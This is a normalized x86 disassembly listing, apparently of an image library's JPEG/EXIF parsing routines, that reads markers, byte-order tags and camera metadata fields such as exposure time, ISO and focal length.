mov edx [ ebp + 0x8 ]
add edx 0x16c
push edx
mov eax [ ebp - 0x4 ]
add eax 0x16c
push eax
call memcpy
add esp 0xc
mov al 0x1
xor al al
jmp r-xdata
sub_4176f0
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x48 ]
mov ecx 0x12
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x4b8
call ??2@YAPAXI@Z
add esp 0x4
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
push 0x4b8
push 0x0
mov edx [ ebp - 0x4 ]
mov eax [ edx ]
push eax
call memset
add esp 0xc
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x200 ] 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x200 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x108 ] 0x0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x104 ] 0x0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fc ] 0x0
push 0xf0
push 0x0
mov eax [ ebp - 0x4 ]
add eax 0x10c
push eax
call memset
add esp 0xc
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
add esp 0x48
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x4
sub_4177c0
push ebp
mov ebp esp
sub esp 0x4c
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x4c ]
mov ecx 0x13
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
cmp [ ebp - 0x8 ] 0x14
jge r-xdata
mov eax [ ebp - 0x4 ]
xor ecx ecx
mov cl [ eax + 0x200 ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x8 ]
imul ecx ecx 0xc
mov edx [ ebp - 0x4 ]
cmp [ edx + ecx + 0x10c ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
add esp 0x4c
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
mov eax [ edx ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0xc ]
push ecx
call ??3@YAXPAX@Z
add esp 0x4
jmp r-xdata
mov eax [ ebp - 0x8 ]
imul eax eax 0xc
mov esi esp
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + eax + 0x10c ]
push edx
call [ free@IAT ]
add esp 0x4
cmp esi esp
call _chkesp
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
sub_417870
push ebp
mov ebp esp
sub esp 0x68
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x68 ]
mov ecx 0x1a
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov esi esp
mov ecx [ ebp + 0x8 ]
call [ edx + 0x2c ]
cmp esi esp
call _chkesp
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xff
jne r-xdata
xor al al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov esi esp
mov ecx [ ebp + 0x8 ]
call [ edx + 0x2c ]
cmp esi esp
call _chkesp
cmp eax 0xd8
je r-xdata
pop edi
pop esi
pop ebx
add esp 0x68
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x4
mov [ ebp - 0x14 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1fc ] 0x14
jl r-xdata
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
push r--data
mov ecx [ ebp - 0x4 ]
add ecx 0x4
push ecx
call strcpy
add esp 0x8
xor al al
jmp r-xdata
cmp [ ebp - 0x8 ] 0x7
jge r-xdata
cmp [ ebp - 0x14 ] 0xff
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov esi esp
mov ecx [ ebp + 0x8 ]
call [ edx + 0x2c ]
cmp esi esp
call _chkesp
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0xff
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x1fc ]
imul edx edx 0xc
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x14 ]
mov [ eax + edx + 0x110 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov esi esp
mov ecx [ ebp + 0x8 ]
call [ eax + 0x2c ]
cmp esi esp
call _chkesp
mov [ ebp - 0x1c ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov esi esp
mov ecx [ ebp + 0x8 ]
call [ edx + 0x2c ]
cmp esi esp
call _chkesp
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
shl eax 0x8
or eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x2
jge r-xdata
push r--data
mov eax [ ebp - 0x4 ]
add eax 0x4
push eax
call strcpy
add esp 0x8
xor al al
jmp r-xdata
cmp [ ebp - 0x8 ] 0x6
jl r-xdata
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x1fc ]
imul eax eax 0xc
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ ecx + eax + 0x114 ] edx
mov esi esp
mov eax [ ebp - 0x10 ]
push eax
call [ malloc@IAT ]
add esp 0x4
cmp esi esp
call _chkesp
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push r--data
mov ecx [ ebp - 0x4 ]
add ecx 0x4
push ecx
call strcpy
add esp 0x8
xor al al
jmp r-xdata
jmp r-xdata
mov esi esp
push r--data
call [ printf@IAT ]
add esp 0x4
cmp esi esp
call _chkesp
xor al al
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x1fc ]
imul eax eax 0xc
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x24 ]
mov [ ecx + eax + 0x10c ] edx
mov eax [ ebp - 0x24 ]
mov cl [ ebp - 0x1c ]
mov [ eax ] cl
mov edx [ ebp - 0x24 ]
mov al [ ebp - 0x18 ]
mov [ edx + 0x1 ] al
mov ecx [ ebp - 0x10 ]
sub ecx 0x2
mov esi esp
push ecx
push 0x1
mov edx [ ebp - 0x24 ]
add edx 0x2
push edx
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov ecx [ ebp + 0x8 ]
call [ edx + 0x8 ]
cmp esi esp
call _chkesp
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x10 ]
sub eax 0x2
cmp [ ebp - 0x20 ] eax
je r-xdata
push r--data
mov ecx [ ebp - 0x4 ]
add ecx 0x4
push ecx
call strcpy
add esp 0x8
xor al al
jmp r-xdata
mov edx [ ebp - 0x8 ]
add edx 0x1
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x1fc ]
add eax 0x1
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x1fc ] eax
mov edx [ ebp - 0x14 ]
mov [ ebp - 0x28 ] edx
mov eax [ ebp - 0x28 ]
sub eax 0xc0
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x3e
ja r-xdata
push r--data
mov ecx [ ebp - 0x4 ]
add ecx 0x4
push ecx
call strcpy
add esp 0x8
xor al al
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x28 ]
xor ecx ecx
mov cl [ edx + lookup_table_417cde ]
jmp [ ecx * 4 + jump_table_417cc2 ]
mov al 0x1
jmp r-xdata
mov esi esp
push r--data
call [ printf@IAT ]
add esp 0x4
cmp esi esp
call _chkesp
xor al al
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x1fc ]
sub ecx 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fc ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x1fc ]
imul ecx ecx 0xc
mov esi esp
mov edx [ ebp - 0x4 ]
mov eax [ edx + ecx + 0x10c ]
push eax
call [ free@IAT ]
add esp 0x4
cmp esi esp
call _chkesp
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x1fc ]
imul edx edx 0xc
mov eax [ ebp - 0x4 ]
mov [ eax + edx + 0x10c ] 0x0
jmp r-xdata
push 0x4
push r--data
mov ecx [ ebp - 0x24 ]
add ecx 0x2
push ecx
call memcmp
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ ebp - 0x14 ]
push ecx
mov edx [ ebp - 0x24 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_418ec0
mov ecx [ ebp - 0x10 ]
push ecx
mov edx [ ebp - 0x24 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_418d80
mov [ ebp - 0xc ] 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x1fc ]
sub ecx 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fc ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x1fc ]
imul ecx ecx 0xc
mov esi esp
mov edx [ ebp - 0x4 ]
mov eax [ edx + ecx + 0x10c ]
push eax
call [ free@IAT ]
add esp 0x4
cmp esi esp
call _chkesp
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x1fc ]
imul edx edx 0xc
mov eax [ ebp - 0x4 ]
mov [ eax + edx + 0x10c ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x1fc ]
sub ecx 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fc ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x1fc ]
imul ecx ecx 0xc
mov esi esp
mov edx [ ebp - 0x4 ]
mov eax [ edx + ecx + 0x10c ]
push eax
call [ free@IAT ]
add esp 0x4
cmp esi esp
call _chkesp
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x1fc ]
imul edx edx 0xc
mov eax [ ebp - 0x4 ]
mov [ eax + edx + 0x10c ] 0x0
mov edx [ ebp - 0x10 ]
push edx
mov eax [ ebp - 0x24 ]
add eax 0x2
push eax
mov ecx [ ebp - 0x4 ]
call sub_417d20
mov ecx [ ebp - 0x4 ]
mov edx [ ecx ]
mov [ edx + 0x4b4 ] al
jmp r-xdata
jmp r-xdata
jmp r-xdata
sub_417d20
push ebp
mov ebp esp
sub esp 0x4c
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x4c ]
mov ecx 0x13
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
mov [ ecx + 0x78 ] 0x0
mov edx [ ebp - 0x4 ]
mov eax [ edx ]
mov [ eax + 0xc4 ] 0x0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x104 ] 0x0
push 0x6
push r--data
mov edx [ ebp + 0x8 ]
push edx
call memcmp
add esp 0xc
test eax eax
je r-xdata
push 0x2
push r--data
mov ecx [ ebp + 0x8 ]
add ecx 0x6
push ecx
call memcmp
add esp 0xc
test eax eax
jne r-xdata
push r--data
mov eax [ ebp - 0x4 ]
add eax 0x4
push eax
call strcpy
add esp 0x8
xor al al
jmp r-xdata
push 0x2
push r--data
mov eax [ ebp + 0x8 ]
add eax 0x6
push eax
call memcmp
add esp 0xc
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x108 ] 0x0
jmp r-xdata
pop edi
pop esi
pop ebx
add esp 0x4c
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x8
push r--data
mov edx [ ebp - 0x4 ]
add edx 0x4
push edx
call strcpy
add esp 0x8
xor al al
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x108 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x8
push eax
mov ecx [ ebp - 0x4 ]
call sub_417f60
cmp eax 0x2a
je r-xdata
mov edx [ ebp + 0x8 ]
add edx 0xa
push edx
mov ecx [ ebp - 0x4 ]
call sub_418050
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0xc ]
push ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx ]
push eax
mov ecx [ ebp + 0xc ]
sub ecx 0x6
push ecx
mov edx [ ebp + 0x8 ]
add edx 0x6
push edx
mov eax [ ebp + 0x8 ]
add eax 0xe
push eax
mov ecx [ ebp - 0x4 ]
call sub_418090
and eax 0xff
test eax eax
jne r-xdata
push r--data
mov ecx [ ebp - 0x4 ]
add ecx 0x4
push ecx
call strcpy
add esp 0x8
xor al al
jmp r-xdata
cmp [ ebp - 0x8 ] 0x8
jle r-xdata
xor al al
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
fld [ ecx + 0xa8 ]
fcomp [ r--data ]
fnstsw ax
test ah 0x40
jne r-xdata
lea ecx [ ebp - 0xc ]
push ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx ]
push eax
mov ecx [ ebp + 0xc ]
sub ecx 0x6
push ecx
mov edx [ ebp + 0x8 ]
add edx 0x6
push edx
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + eax + 0x6 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_418090
and eax 0xff
test eax eax
jne r-xdata
mov al 0x1
mov edx [ ebp - 0x4 ]
fild [ edx + 0x104 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
fmul [ ecx + 0xb0 ]
mov edx [ ebp - 0x4 ]
mov eax [ edx ]
fdiv [ eax + 0xa8 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx ]
fstp [ edx + 0x8c ]
xor al al
jmp r-xdata
sub_417f20
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cl [ eax ]
mov eax ecx
shl eax 0x8
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov cl [ edx + 0x1 ]
or eax ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_417f60
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x108 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x1 ]
mov eax ecx
shl eax 0x8
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov cl [ edx ]
or eax ecx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dl [ ecx ]
mov eax edx
shl eax 0x8
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dl [ ecx + 0x1 ]
or eax edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_417fc0
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x108 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
movsx eax [ edx + 0x3 ]
shl eax 0x18
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dl [ ecx + 0x2 ]
shl edx 0x10
or eax edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dl [ ecx + 0x1 ]
shl edx 0x8
or eax edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dl [ ecx ]
or eax edx
mov ecx [ ebp + 0x8 ]
movsx eax [ ecx ]
shl eax 0x18
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov cl [ edx + 0x1 ]
shl ecx 0x10
or eax ecx
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov cl [ edx + 0x2 ]
shl ecx 0x8
or eax ecx
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov cl [ edx + 0x3 ]
or eax ecx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_418050
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_417fc0
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x4
sub_418090
push ebp
mov ebp esp
sub esp 0xa0
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0xa0 ]
mov ecx 0x28
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x18 ] 0x0
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_417f60
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x10 ]
imul ecx ecx 0xc
mov edx [ ebp + 0x8 ]
lea eax [ edx + ecx + 0x2 ]
mov ecx [ ebp + 0xc ]
add ecx [ ebp + 0x10 ]
cmp eax ecx
jbe r-xdata
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
push r--data
mov edx [ ebp - 0x4 ]
add edx 0x4
push edx
call strcpy
add esp 0x8
xor al al
jmp r-xdata
mov ecx [ ebp - 0x8 ]
cmp ecx [ ebp - 0x10 ]
jge r-xdata
pop edi
pop esi
pop ebx
add esp 0xa0
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x14
mov ecx [ ebp - 0x10 ]
imul ecx ecx 0xc
mov edx [ ebp + 0x8 ]
lea eax [ edx + ecx + 0x2 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_417f60
mov [ ebp - 0x44 ] eax
cmp [ ebp - 0x44 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
imul edx edx 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ eax + edx + 0x2 ]
mov [ ebp - 0x30 ] ecx
mov edx [ ebp - 0x30 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_417f60
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x30 ]
add eax 0x2
push eax
mov ecx [ ebp - 0x4 ]
call sub_417f60
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x30 ]
add ecx 0x4
push ecx
mov ecx [ ebp - 0x4 ]
call sub_418050
mov [ ebp - 0x24 ] eax
mov edx [ ebp - 0x20 ]
sub edx 0x1
cmp edx 0xc
jl r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov ecx [ ebp + 0xc ]
add ecx [ ebp - 0x44 ]
mov [ ebp - 0x40 ] ecx
mov edx [ ebp - 0x40 ]
cmp edx [ ebp + 0xc ]
jb r-xdata
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x24 ]
imul edx [ ecx * 4 + r--data ]
mov [ ebp - 0x2c ] edx
cmp [ ebp - 0x2c ] 0x4
jle r-xdata
push r--data
mov eax [ ebp - 0x4 ]
add eax 0x4
push eax
call strcpy
add esp 0x8
xor al al
jmp r-xdata
mov al 0x1
cmp [ ebp - 0x14 ] 0x0
je r-xdata
push r--data
mov ecx [ ebp - 0x4 ]
add ecx 0x4
push ecx
call strcpy
add esp 0x8
xor al al
jmp r-xdata
mov eax [ ebp + 0xc ]
add eax [ ebp + 0x10 ]
cmp [ ebp - 0x40 ] eax
jbe r-xdata
mov ecx [ ebp - 0x30 ]
add ecx 0x8
mov [ ebp - 0x28 ] ecx
mov eax [ ebp - 0x30 ]
add eax 0x8
push eax
mov ecx [ ebp - 0x4 ]
call sub_418050
mov [ ebp - 0x34 ] eax
mov ecx [ ebp - 0x34 ]
add ecx [ ebp - 0x2c ]
cmp ecx [ ebp + 0x10 ]
jbe r-xdata
mov ecx [ ebp - 0x18 ]
add ecx [ ebp - 0x14 ]
cmp ecx [ ebp + 0x10 ]
ja r-xdata
mov edx [ ebp + 0x18 ]
push edx
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp - 0x40 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_418090
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x48 ] eax
cmp [ ebp - 0x48 ] 0x9201
jg r-xdata
mov ecx [ ebp - 0x28 ]
add ecx [ ebp - 0x2c ]
mov edx [ ebp + 0x18 ]
mov [ edx ] ecx
mov eax [ ebp + 0xc ]
add eax [ ebp - 0x34 ]
mov [ ebp - 0x28 ] eax
jmp r-xdata
push r--data
mov edx [ ebp - 0x4 ]
add edx 0x4
push edx
call strcpy
add esp 0x8
xor al al
jmp r-xdata
mov edx [ ebp + 0xc ]
add edx [ ebp - 0x14 ]
mov eax [ ebp + 0x14 ]
mov [ eax + 0x4ac ] edx
mov ecx [ ebp + 0x14 ]
mov edx [ ebp - 0x18 ]
mov [ ecx + 0x4b0 ] edx
cmp [ ebp - 0x48 ] 0x9286
jg r-xdata
cmp [ ebp - 0x48 ] 0x9201
je r-xdata
mov edx [ ebp - 0x28 ]
add edx [ ebp - 0x2c ]
mov eax [ ebp + 0x18 ]
cmp [ eax ] edx
jae r-xdata
cmp [ ebp - 0x48 ] 0xa20f
jg r-xdata
cmp [ ebp - 0x48 ] 0x9286
je r-xdata
mov eax [ ebp + 0x14 ]
fld [ eax + 0x80 ]
fcomp [ r--data ]
fnstsw ax
test ah 0x40
je r-xdata
cmp [ ebp - 0x48 ] 0x202
jg r-xdata
cmp [ ebp - 0x48 ] 0xa210
je r-xdata
cmp [ ebp - 0x48 ] 0xa20f
je r-xdata
mov edx [ ebp - 0x2c ]
mov [ ebp - 0xc ] edx
mov ecx [ ebp - 0x48 ]
sub ecx 0x9202
mov [ ebp - 0x48 ] ecx
cmp [ ebp - 0x48 ] 0x8
ja r-xdata
jmp r-xdata
mov ecx [ ebp - 0x20 ]
push ecx
mov edx [ ebp - 0x28 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_418bf0
fstp [ ebp - 0x58 ]
push 0x40000000
push 0x0
call log
add esp 0x8
fmul [ ebp - 0x58 ]
sub esp 0x8
fstp [ esp ]
call exp
add esp 0x8
fdivr [ r--data ]
mov eax [ ebp + 0x14 ]
fstp [ eax + 0x80 ]
cmp [ ebp - 0x48 ] 0x8827
jg r-xdata
cmp [ ebp - 0x48 ] 0x202
je r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov ecx [ ebp - 0x28 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_418bf0
call _ftol
mov [ ebp - 0x60 ] eax
mov edx [ ebp - 0x60 ]
sub edx 0x1
mov [ ebp - 0x60 ] edx
cmp [ ebp - 0x60 ] 0x4
ja r-xdata
jmp r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov ecx [ ebp - 0x28 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_418bf0
mov edx [ ebp + 0x14 ]
fstp [ edx + 0xac ]
jmp r-xdata
cmp [ ebp - 0x48 ] 0xa002
jl r-xdata
jmp r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0xc ]
mov [ eax ] 0x0
jmp r-xdata
cmp [ ebp - 0x1c ] 0x8769
je r-xdata
mov edx [ ebp - 0x48 ]
jmp [ edx * 4 + jump_table_418ba2 ]
cmp [ ebp - 0x48 ] 0x9000
je r-xdata
cmp [ ebp - 0x48 ] 0x8827
je r-xdata
mov ecx [ ebp - 0x20 ]
push ecx
mov edx [ ebp - 0x28 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_418bf0
call _ftol
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x48 ]
sub ecx 0x10f
mov [ ebp - 0x48 ] ecx
cmp [ ebp - 0x48 ] 0xf2
ja r-xdata
jmp r-xdata
mov eax [ ebp - 0x60 ]
jmp [ eax * 4 + jump_table_418bda ]
cmp [ ebp - 0x48 ] 0xa003
jle r-xdata
push 0x5
push r--data
mov ecx [ ebp - 0x28 ]
push ecx
call memcmp
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x28 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_418050
mov ecx [ ebp + 0xc ]
add ecx eax
mov [ ebp - 0x3c ] ecx
mov edx [ ebp - 0x3c ]
cmp edx [ ebp + 0xc ]
jb r-xdata
cmp [ ebp - 0x1c ] 0xa005
jne r-xdata
mov edx [ ebp + 0x14 ]
fld [ edx + 0x84 ]
fcomp [ r--data ]
fnstsw ax
test ah 0x40
je r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov ecx [ ebp - 0x28 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_418bf0
mov edx [ ebp + 0x14 ]
fstp [ edx + 0xc0 ]
jmp r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov ecx [ ebp - 0x28 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_418bf0
mov edx [ ebp + 0x14 ]
fstp [ edx + 0x7c ]
jmp r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov ecx [ ebp - 0x28 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_418bf0
mov edx [ ebp + 0x14 ]
fstp [ edx + 0x88 ]
jmp r-xdata
mov ecx [ ebp - 0x20 ]
push ecx
mov edx [ ebp - 0x28 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_418bf0
call _ftol
and eax 0x7
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov ecx [ ebp - 0x28 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_418bf0
mov edx [ ebp + 0x14 ]
fstp [ edx + 0x90 ]
jmp r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov ecx [ ebp - 0x28 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_418bf0
call _ftol
mov edx [ ebp + 0x14 ]
mov [ edx + 0x94 ] eax
jmp r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov ecx [ ebp - 0x28 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_418bf0
call _ftol
mov edx [ ebp + 0x14 ]
mov [ edx + 0x98 ] eax
jmp r-xdata
mov esi esp
push 0x4
mov ecx [ ebp - 0x28 ]
push ecx
mov edx [ ebp + 0x14 ]
push edx
call [ strncpy@IAT ]
add esp 0xc
cmp esi esp
call _chkesp
jmp r-xdata
cmp [ ebp - 0x48 ] 0x9003
je r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov ecx [ ebp - 0x28 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_418bf0
call _ftol
mov edx [ ebp + 0x14 ]
mov [ edx + 0xa0 ] eax
mov eax [ ebp + 0x14 ]
cmp [ eax + 0xa0 ] 0x32
jge r-xdata
cmp [ ebp - 0x48 ] 0x829a
je r-xdata
mov eax [ ebp - 0x48 ]
xor edx edx
mov dl [ eax + lookup_table_418aaf ]
jmp [ edx * 4 + jump_table_418a8f ]
mov ecx [ ebp + 0x14 ]
mov [ ecx + 0xb0 ] 0x3f800000
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx + 0xb0 ] 0x3f800000
jmp r-xdata
mov eax [ ebp + 0x14 ]
mov [ eax + 0xb0 ] 0x3ec99326
jmp r-xdata
mov ecx [ ebp + 0x14 ]
mov [ ecx + 0xb0 ] 0x3d214285
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx + 0xb0 ] 0x3825214d
mov eax [ ebp - 0x20 ]
push eax
mov ecx [ ebp - 0x28 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_418bf0
call _ftol
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x104 ]
cmp eax [ ebp - 0xc ]
jge r-xdata
cmp [ ebp - 0x48 ] 0xa20e
je r-xdata
mov esi esp
push 0xc7
mov eax [ ebp - 0x28 ]
push eax
mov ecx [ ebp + 0x14 ]
add ecx 0xc4
push ecx
call [ strncpy@IAT ]
add esp 0xc
cmp esi esp
call _chkesp
mov [ ebp - 0xc ] 0x5
jmp r-xdata
jmp r-xdata
jmp r-xdata
push r--data
mov ecx [ ebp - 0x4 ]
add ecx 0x4
push ecx
call strcpy
add esp 0x8
xor al al
jmp r-xdata
mov eax [ ebp + 0xc ]
add eax [ ebp + 0x10 ]
cmp [ ebp - 0x3c ] eax
jbe r-xdata
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov ecx [ ebp - 0x28 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_418bf0
fstp [ ebp - 0x50 ]
push 0x40000000
push 0x0
call log
add esp 0x8
fmul [ ebp - 0x50 ]
fmul [ r--data ]
sub esp 0x8
fstp [ esp ]
call exp
add esp 0x8
mov edx [ ebp + 0x14 ]
